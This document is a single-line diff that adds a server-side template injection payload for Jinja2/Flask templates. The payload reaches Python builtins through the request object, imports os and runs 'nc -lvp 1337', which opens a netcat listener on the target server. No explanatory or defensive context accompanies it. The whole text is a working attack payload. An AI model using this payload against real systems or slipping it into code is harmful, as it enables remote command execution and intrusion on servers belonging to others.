@@ -1,0 +1,1 @@
+{{ request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('nc -lvp 1337')['read']() }}
